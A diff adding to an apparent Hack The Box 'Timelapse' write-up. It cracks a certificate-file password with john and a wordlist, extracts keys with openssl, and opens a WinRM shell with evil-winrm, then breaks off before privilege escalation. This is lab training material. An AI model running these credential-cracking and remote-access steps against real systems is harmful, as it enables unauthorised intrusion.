@@ -53,6 +53,14 @@ Nmap done: 1 IP address (1 host up) scanned in 97.14 seconds
 
 From the result nmap gave we can tell its an AD box
 
+I'll add the domain name to my /etc/hosts file
+
+```
+┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Timelapse]
+└─$ cat /etc/hosts | grep dc01
+10.10.11.152    dc01.timelapse.htb timelapse.htb
+```
+
 Checking smb shows we have only read access over the Share `shares` in smb
 
 ```
@@ -193,4 +201,143 @@ drwxr-xr-x 4 mark mark    4096 Feb  7 04:22 ..
 -rw-r--r-- 1 mark mark 1118208 Feb  7 04:21 LAPS.x64.msi
 ```
 
-Word document file. I'll open it up on windows since libreoffice refuses to work for me
+Word document file. I'll open it up on windows since libreoffice refuses to work for me 
+
+So basically the file talks about LAPS (Local Administrator Password Management Datasheet)
+![image](https://user-images.githubusercontent.com/113513376/217142161-ccd52dd4-c6d7-43df-93e7-1357609b68b1.png)
+
+And there's a binary which comes along it to install LAPS
+![image](https://user-images.githubusercontent.com/113513376/217142370-4567e10b-2e4c-49fd-9fb3-6459a0403753.png)
+
+Local Administrator Password Solution (LAPS) is a method of managing the passwords for the local administrator accounts via the domain. Without laps, it’s very challenging for a support team to manage keeping unique local admin passwords for each system. This leads to shared credentials, which means that when an attacker gets elevated privileges on a system, they can dump the shared cred and use it to get access on other systems.
+
+LAPS also rotates administrator passwords, changing them periodically, such that if they are captured by an attacker, they become invalid after some period of time.
+
+So the .pfx file is going to contain keys for us to login as 
+
+Using this [post](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file)
+
+I tried it but it requires password
+
+```
+┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
+└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out lol.key
+Enter Import Password:
+Mac verify error: invalid password?
+```
+
+Luckily john the ripper can brute force this if converted to hash 
+
+```
+┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
+└─$ pfx2john legacyy_dev_auth.pfx > hash
+                                                                                                                                                                                                                   
+┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
+└─$ john -w=/home/mark/Documents/rockyou.txt hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
+Cost 1 (iteration count) is 2000 for all loaded hashes
+Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+thuglegacy       (legacyy_dev_auth.pfx)     
+1g 0:00:01:45 DONE (2023-02-07 05:08) 0.009457g/s 30558p/s 30558c/s 30558C/s thuglife06..thug211
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+Cool now i'll run it using the password `thuglegacy`
+
+With the password, I can extract the key and certificate. When extracting the key, it asks for the password (I’ll provide `thuglegacy`), and then a password for the output .pem file (anything I want, must be at least four characters):
+
+```
+┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
+└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key 
+Enter Import Password:
+Enter PEM pass phrase:
+Verifying - Enter PEM pass phrase:
+```
+
+Now i'll decrypt the key using the pem pass phrase set in my case i used `1234`
+
+```
+┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
+└─$  openssl rsa -in legacyy_dev_auth.key -out legacyy_dev_auth.key1 
+Enter pass phrase for legacyy_dev_auth.key:
+writing RSA key
+```
+
+Next i'll dump it 
+
+```
+┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
+└─$  openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
+Enter Import Password:
+
+┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
+└─$ l
+legacyy_dev_auth.crt  legacyy_dev_auth.key  legacyy_dev_auth.key1  legacyy_dev_auth.pfx*
+```
+
+Cool with this we can get access to winrm
+
+```
+┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
+└─$ evil-winrm --help                                
+
+Evil-WinRM shell v3.4
+
+Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
+    -S, --ssl                        Enable ssl
+    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
+    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
+    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
+    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
+        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
+    -e, --executables EXES_PATH      C# executables local path
+    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
+    -U, --url URL                    Remote url endpoint (default /wsman)
+    -u, --user USER                  Username (required if not using kerberos)
+    -p, --password PASS              Password
+    -H, --hash HASH                  NTHash
+    -P, --port PORT                  Remote host port (default 5985)
+    -V, --version                    Show version
+    -n, --no-colors                  Disable colors
+    -N, --no-rpath-completion        Disable remote path completion
+    -l, --log                        Log the WinRM session
+    -h, --help                       Display this help message
+```
+
+Just specify the argument then login
+
+```
+┌──(venv)─(mark__haxor)-[~/_/B2B/HTB/Timelapse/Dev]
+└─$ evil-winrm -S -c legacyy_dev_auth.crt -k legacyy_dev_auth.key -i timelapse.htb  
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+Enter PEM pass phrase:
+*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami 
+timelapse\legacyy
+*Evil-WinRM* PS C:\Users\legacyy\Documents> 
+```
+
+Cool time to escalate privilege 
+
+I'll upload winPEAS to the box and run it
+
+```
+
+
+
+
+
+
